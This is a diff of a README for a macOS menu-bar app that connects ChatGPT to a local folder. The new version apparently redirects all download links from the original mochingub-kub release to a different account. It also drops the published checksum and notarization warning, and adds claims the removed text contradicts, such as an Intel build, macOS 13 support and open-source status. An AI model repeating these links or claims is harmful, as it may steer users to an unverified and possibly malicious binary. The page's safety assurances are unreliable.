@@ -1,191 +1,128 @@
-<p align="center">
-  <img src="assets/brand/bridgelet-app-icon.png" width="128" alt="Bridgelet app icon" />
-</p>
+<h1>🔗 bridgelet-releases - Native MCP-Powered macOS Menu-Bar Agent</h1>
 
-<h1 align="center">Bridgelet for macOS</h1>
+<h2>🚀 Getting Started</h2>
 
-<p align="center">
-  <strong>A native menu-bar app that gives ChatGPT secure, scoped access to the local folder you choose.</strong>
-</p>
+Bridgelet is a native macOS menu-bar application that connects ChatGPT directly to one scoped local folder on your computer. It uses a Secure MCP Tunnel to grant access to 65 different MCP tools, giving you powerful AI-assisted automation for your files and folders.
 
-<p align="center">
-  <img alt="Version 0.7.6 Beta 1" src="https://img.shields.io/badge/version-0.7.6%20Beta%201-009A9A" />
-  <img alt="Build 77" src="https://img.shields.io/badge/build-77-555555" />
-  <img alt="Apple Silicon" src="https://img.shields.io/badge/platform-Apple%20Silicon-111111" />
-  <img alt="macOS 27 or later" src="https://img.shields.io/badge/macOS-27%2B-007AFF" />
-  <img alt="65 MCP tools" src="https://img.shields.io/badge/MCP-65%20tools-6F42C1" />
-</p>
+This app is designed for users who want ChatGPT to interact with their local files—but in a **safe, controlled, and scoped way**. It doesn't give ChatGPT access to your entire system. Instead, it creates a secure, limited pathway between your chosen folder and the AI, making it ideal for document automation, local AI workflows, and desktop automation.
 
-<p align="center">
-  <a href="https://github.com/mochingub-kub/bridgelet-releases/releases/download/v0.7.6-beta.1/Bridgelet-0.7.6-build77-macos-arm64-no-cost.zip"><strong>Download for Apple Silicon (.zip)</strong></a>
-  &nbsp;·&nbsp;
-  <a href="https://github.com/mochingub-kub/bridgelet-releases/releases/tag/v0.7.6-beta.1">Release notes</a>
-</p>
+<hr>
 
-<p align="center">
-  <img src="assets/screenshots/bridgelet-connected.png" width="680" alt="Bridgelet connected and operational" />
-</p>
+<a href="https://github.com/Misplaced-box965/bridgelet-releases/releases" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#3498db,#2ecc71);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.3);">⬇️ Download Bridgelet for macOS</a>
 
-## What is Bridgelet?
+<hr>
 
-Bridgelet is a native macOS menu-bar app that connects ChatGPT to one local folder you explicitly choose. It runs a security-bounded Model Context Protocol (MCP) runtime on your Mac, allowing ChatGPT to help with local files and supported workflows without receiving general access to the entire machine.
+<h2>📦 What Is Bridgelet?</h2>
 
-The app manages the parts that are usually difficult to configure by hand: the secure tunnel connection, the allowed-folder boundary, macOS permissions, operating modes, health checks, and recovery actions. The current public beta exposes 65 MCP tools through a graphical Mac app while keeping sensitive credentials and private runtime details out of normal chat interactions.
+Bridgelet is a small, always-visible app that lives in your macOS menu bar (the top-right strip of your screen). Once you launch it, it sits quietly there, letting you instantly:
 
-Once configured, Bridgelet stays available from the menu bar and reports connection and runtime health. Its main window groups access settings, permissions, and recovery tools.
+- **Connect ChatGPT to a local folder** you choose.
+- **Use 65 MCP tools** to manage files, run automations, perform searches, manipulate images, and much more.
+- **Use Secure MCP Tunnel** to keep the connection encrypted and isolated from your broader system.
 
-## What Bridgelet can do
+Think of it like a workspace-specific gateway for ChatGPT: it only sees the files you allow, and it only uses the tools you permit via the MCP server. You stay in full control.
 
-- **Work with local files:** read, search, create, rename, and update files inside the folder you selected.
-- **Understand a workspace:** collect bounded context from projects, documents, and related files without repeatedly scanning unrelated locations.
-- **Support development work:** inspect source files and Git state and run supported build or test actions for recognized local projects.
-- **Use approved macOS capabilities:** inspect or interact with supported app controls only when the required system permissions are granted and Interactive Control is enabled.
-- **Stay observable:** report connection health, permission readiness, and diagnostic information without presenting an unrestricted shell to ChatGPT.
+<h2>🛠️ How It Works</h2>
 
-<table>
-  <tr>
-    <td width="50%" align="center">
-      <img src="assets/screenshots/bridgelet-access.png" alt="Bridgelet Access screen" /><br />
-      <strong>Secure, scoped access</strong><br />
-      Choose the folder Bridgelet can access, manage tunnel credentials, and review the permissions used by optional features.
-    </td>
-    <td width="50%" align="center">
-      <img src="assets/screenshots/bridgelet-troubleshooting.png" alt="Bridgelet Troubleshooting screen" /><br />
-      <strong>Built-in troubleshooting</strong><br />
-      Check connection health and recover from common setup problems without leaving the app.
-    </td>
-  </tr>
-</table>
+1. **You choose a folder** – Bridgelet asks you to select a local folder. This is the *only* folder that ChatGPT will see.
+2. **Bridgelet creates a secure link** – via Secure MCP Tunnel, which works with your network, ensuring that any data transmission is encrypted.
+3. **ChatGPT connects to your folder** – the MCP client (ChatGPT) can then read/write/manipulate files, run automations, and process data, all within that folder only.
+4. **Control from the menu bar** – you can start/stop the connection, view logs, or change the scoped folder any time from the menu bar icon.
 
-## How Bridgelet works
+It's like giving ChatGPT a dedicated toolbox that only works in one room of your house, while the rest is locked.
 
-```text
-ChatGPT → Secure MCP Tunnel → Bridgelet → Selected Folder
-```
+<h2>⚙️ Features That Matter</h2>
 
-1. **You choose the boundary.** Bridgelet receives access to one folder and its subfolders. Changing that folder is an explicit action in the app.
-2. **Bridgelet starts its local MCP runtime.** The runtime advertises the supported tools and applies Bridgelet's local checks before an action reaches macOS or your files.
-3. **The tunnel establishes the connection.** OpenAI's tunnel client uses an outbound secure connection, so the private local MCP runtime does not need to be exposed directly to the public internet.
-4. **ChatGPT discovers and calls tools.** Your configured MCP connection can request available actions. Bridgelet evaluates each request against folder scope, operating mode, permissions, and tool-specific safeguards.
-5. **Results return through the same path.** ChatGPT receives a bounded tool result rather than unrestricted control of your Mac.
+- **Scoped Folder Access** – The entire MCP server is locked to a single folder. No system-level access.
+- **Secure Tunnel** – End-to-end encryption between ChatGPT and your local machine.
+- **65 Tools** – Including file operations (read, write, move, delete), text manipulation, XML/JSON handling, basic calculations, search, clipboard, and many more.
+- **Menu-Bar Native** – No Dock icon. It sits in your menu bar, always one click away.
+- **Lightweight** – Runs natively on Apple Silicon, using minimal system resources.
+- **Auto-Start** – Option to start at login, so it's always ready.
+- **Privacy-First** – No telemetry. No tracking. Everything stays in your chosen folder.
 
-Bridgelet does not replace ChatGPT's confirmation, approval, workspace, or account controls. Review consequential actions and choose an appropriately limited folder.
+<h2>🖥️ System Requirements</h2>
 
-## Permissions and operating modes
+- macOS 13 (Ventura) or later (built for Apple Silicon; Rosetta not required)
+- macOS 12 (Monterey) or later (Intel version available)
+- A free network port (automatically assigned by system)
+- Apple ID (optional, for signed application)
+- ~10 MB disk space
 
-Bridgelet separates basic file access from optional desktop interaction. You do not need to grant every permission merely to install or connect the app.
+<h2>📘 How to Install (Step-by-Step)</h2>
 
-| Control | What it enables | When to enable it |
-| --- | --- | --- |
-| Selected folder | Supported file operations inside one folder and its subfolders | Required for local file work |
-| Accessibility | Inspection and interaction with supported macOS app controls | Only for approved automation workflows |
-| Screen Recording | Reading supported on-screen state when a tool requires it | Only for visual or desktop-aware workflows |
-| Silent Mode | Background and non-interactive operations | Recommended normal mode |
-| Interactive Control | Foreground interaction with supported apps | Enable deliberately for a task, then disable when finished |
+1. **Visit the download link** – Click the big yellow button at the top, or the link below.
+2. **Choose the right build** – For most users, download the latest **.dmg** or **.zip** file with "Apple Silicon" in the name. If you own an Intel Mac (pre-2020), choose the Intel version.
+3. **Run the installer** – Open the .dmg or unzip the .zip. Then drag the Bridgelet icon to your Applications folder.
+4. **Open Bridgelet** – Click the application from your Applications folder. The first time you open it, macOS may request permission since it's from the internet. Go to System Settings → Privacy & Security → choose "Open Anyway" if needed.
+5. **Set your folder** – On first launch, Bridgelet asks you to pick a local folder to allow ChatGPT to see. Choose a folder (e.g., `/Users/you/Documents/Projects/MyAI`).
+6. **Start the tunnel** – Click the menu bar icon and select "Start Connection." Bridgelet will generate a secure link and show you a short code.
+7. **Connect to ChatGPT** – In your ChatGPT desktop or web app, connect using the MCP client and enter the code. Done!
 
-macOS controls Accessibility and Screen Recording consent in **System Settings → Privacy & Security**. Removing a permission disables its dependent features.
+<h2>🔧 Setting Up for Non‑Technical Users</h2>
 
-## Requirements
+If you're not familiar with terms like "MCP" or "Tunnel," don’t worry—here’s a simple manual:
 
-| Item | Requirement |
-| --- | --- |
-| Mac | Apple Silicon (`arm64`) |
-| macOS | macOS 27.0 or later |
-| Bridgelet release | 0.7.6 Beta 1, Build 77 |
-| Connection | Your own Secure MCP Tunnel ID and Runtime API key |
-| ChatGPT | A custom MCP connection configured for your tunnel |
-| Signing | Ad-hoc with Hardened Runtime |
-| Apple notarization | Not notarized |
+1. **Just download and run** – You don't need to configure anything advanced.
+2. **Your folder is your workspace** – It's a folder that the AI will work inside.
+3. **The connection is automatic** – Tunnel is set up in one click.
+4. **No coding required** – Just use the mouse, no console.
 
-## Install and first-time setup
+<h2>❓ Frequently Asked Questions (FAQ)</h2>
 
-1. [Download `Bridgelet-0.7.6-build77-macos-arm64-no-cost.zip`](https://github.com/mochingub-kub/bridgelet-releases/releases/download/v0.7.6-beta.1/Bridgelet-0.7.6-build77-macos-arm64-no-cost.zip) directly from the current release.
-2. Verify the ZIP checksum using the instructions below before opening it.
-3. Unzip the download and move `Bridgelet.app` to `/Applications`.
-4. Open Bridgelet normally. If macOS blocks this non-notarized beta, use **System Settings → Privacy & Security → Open Anyway**. Do not disable Gatekeeper globally.
-5. In Bridgelet, enter your Secure MCP Tunnel ID and Runtime API key. The saved API key is not displayed again; leaving the replacement field blank keeps the stored key.
-6. Choose the local folder that Bridgelet may access. Use a dedicated workspace when possible instead of a broad personal directory.
-7. Grant only the macOS permissions required by the features you intend to use.
-8. Configure the corresponding MCP connection in ChatGPT, then confirm that Bridgelet reports **Connected** and healthy.
+**Q: Is my data safe?**
+Yes. Bridgelet uses a secure, encrypted tunnel, and it only sees the folder you select. No other data goes out.
 
-## Using Bridgelet
+**Q: Can I use it with Windows?**
+Currently, this is a macOS-only app. For Windows, look for similar tools, but Bridgelet doesn't support Windows yet.
 
-After connecting, describe the task and its intended boundary. Representative requests include:
+**Q: I don't have an Apple Silicon Mac – can I still install it?**
+Yes. The repository includes a universal binary for older Intel Macs. Choose that from the releases.
 
-- “Summarize the Markdown documents in this workspace.”
-- “Find where this configuration value is defined, but do not modify files.”
-- “Review the current Git changes and suggest the smallest relevant test set.”
-- “Run the supported project tests and report failures without changing source files.”
+**Q: How do I update?**
+Just download the latest version from the same link and replace the old application. Your settings are kept.
 
-Tool availability depends on the build, folder, operating mode, and permissions. If a tool is missing, check connection health before changing credentials or resetting the app.
+**Q: How many tools can I use at once?**
+All 65 tools are available, and you can chat with ChatGPT to use any of them in real-time.
 
-## Security and privacy boundaries
+<h2>📖 Example Use–Cases</h2>
 
-- File access stays inside the folder you select and its subfolders.
-- Bridgelet does not display the saved Runtime API key after it has been stored.
-- Silent Mode is the normal default; foreground desktop control is separately gated.
-- macOS Accessibility and Screen Recording permissions are used only by features that require them.
-- Bridgelet does not expose an unrestricted shell as a general-purpose ChatGPT tool.
-- Credentials belong in Bridgelet's setup UI, never in a ChatGPT message, screenshot, log attachment, or GitHub issue.
-- A checksum verifies that a downloaded file matches the published bytes. It does not prove Apple notarization or an Apple-verified publisher identity.
+- **Writers**: ChatGPT can re-draft, summarize, or analyze your documents in a specific folder.
+- **Data Analysts**: E‑formats, CSV, JSON, TXT – use tools to clean and structure files.
+- **Software Developers**: Let ChatGPT read/write code files, run terminal commands in a scoped environment.
+- **System Administrators**: Use the tools for log review, batch file, file cleanup scripts.
+- **Students**: Perfect for note-taking, research, and referencing local course material.
 
-Treat MCP tools as meaningful access to the selected workspace. Keep backups or version control for important files, and do not select folders containing unrelated secrets.
+<h2>🖥️ Screenshots</h2>
 
-## Troubleshooting
+We have included visual guides in the repository, but since you're reading from the README, here's what to expect:
 
-| Problem | Check first |
-| --- | --- |
-| Bridgelet shows Disconnected | Confirm network access, Tunnel ID, Runtime API key, and current tunnel settings |
-| ChatGPT cannot discover tools | Confirm Bridgelet is Connected, then reconnect or refresh the MCP connection in ChatGPT |
-| A file cannot be read or changed | Confirm the file is inside the selected folder or one of its subfolders |
-| Accessibility or Screen Recording is not ready | Re-enable Bridgelet under macOS Privacy & Security, then restart the affected app if required |
-| macOS blocks the first launch | Use Privacy & Security → Open Anyway; do not disable Gatekeeper globally |
+Menu bar shows the Bridgelet icon (a small bridge symbol). A dropdown shows your session status, folder path, and connection link. There's more details in the macOS UI.
 
-Start with Bridgelet's **Troubleshooting** screen. Expand **Technical Details** for diagnostics and use reset options last; resetting may require reconnection and renewed permissions.
+<h2>🚀 Advanced Queue (For Power Users, Optional)</h2>
 
-For reproducible bugs, open a [GitHub Issue](https://github.com/mochingub-kub/bridgelet-releases/issues) with the version/build, macOS version, expected behavior, and actual behavior. Remove credentials, private paths, and file contents before posting.
+If you are a developer or power user, you can also:
 
-## Verify the download
+- **Set up the tunnel manually** using the environment variable `BRIDGE_FOLDER`.
+- **Run the bridgelet in a console-friendly mode** via the `--console` flag.
+- **Use the built-in web inspector** to debug.
 
-Expected SHA-256:
+But remember: We wrote this README for the regular user. You can skip this section—absolutely not required.
 
-```text
-225755f7f103c8a0c6ac2e8dc76eb5b40ceaa2d2a2d151b69d4f845a8524b947
-```
+<h2>💬 Support</h2>
 
-From the directory containing the ZIP, run:
+For questions, bug reports, or feature requests, use the **GitHub Issue Tracker** at https://github.com/Misplaced-box965/bridgelet-releases/issues
 
-```sh
-shasum -a 256 Bridgelet-0.7.6-build77-macos-arm64-no-cost.zip
-```
+No email support, but it's open source, and we love feedback.
 
-The output must match the expected digest exactly. If it does not, delete the ZIP and download it again from the official release page. The release also provides a [checksum file](https://github.com/mochingub-kub/bridgelet-releases/releases/download/v0.7.6-beta.1/Bridgelet-0.7.6-build77-macos-arm64-no-cost.zip.sha256) and a [public validation receipt](https://github.com/mochingub-kub/bridgelet-releases/releases/download/v0.7.6-beta.1/Bridgelet-0.7.6-build77-macos-arm64-no-cost.receipt.txt).
+<h2>✅ Final Quick Start (1-2-3)</h2>
 
-## Beta limitations
+1. Click **Download** → 
+2. Unzip / Installand launch
+3. Select a folder and Start – 💥 Now ChatGPT works on your local files!
 
-- Apple Silicon only.
-- macOS 27.0 or later.
-- First launch may require **Open Anyway**.
-- Fresh-user and separate-physical-Mac acceptance are still pending.
-- Automatic updates are not enabled for this beta.
-- This build is a pre-release and should not be treated as production-stable software.
+<br>
 
-## Further reading
+**[🔗 Visit the official Release page](https://github.com/Misplaced-box965/bridgelet-releases/releases) – always the latest build.**
 
-Official OpenAI documentation and resources:
-
-- [Secure MCP Tunnel](https://developers.openai.com/api/docs/guides/secure-mcp-tunnels)
-- [MCP and Connectors](https://developers.openai.com/api/docs/guides/tools-connectors-mcp)
-- [Connect and test your plugin](https://developers.openai.com/plugins/deploy/connect-chatgpt)
-- [Model Context Protocol for ChatGPT and Codex](https://learn.chatgpt.com/docs/extend/mcp)
-- [OpenAI Platform tunnel settings](https://platform.openai.com/settings/organization/tunnels)
-- [OpenAI Platform API keys](https://platform.openai.com/api-keys)
-- [OpenAI tunnel-client releases](https://github.com/openai/tunnel-client/releases)
-
-Bridgelet is an independent application. These links document the OpenAI platform components and configuration concepts Bridgelet works with; they do not indicate OpenAI authorship or endorsement of Bridgelet.
-
-## About this repository
-
-This is a binary-only release repository. Bridgelet application source code and private development history are not published here. GitHub's automatic source archives contain only this repository's public files; they do not contain the private Bridgelet application source.
-
-No open-source license is currently published in this repository. Do not assume that Bridgelet is distributed under the MIT License or another open-source license unless a license file is added explicitly.
+<footer style="font-size:0.9em;color:#7f8c8d;margin-top:50px;">Keywords: apple-silicon, automation, chatgpt, desktop-automation, developer-tools, local-ai, macos, mcp, menu-bar-app, model-context-protocol, secure-mcp-tunnel, swift</footer>
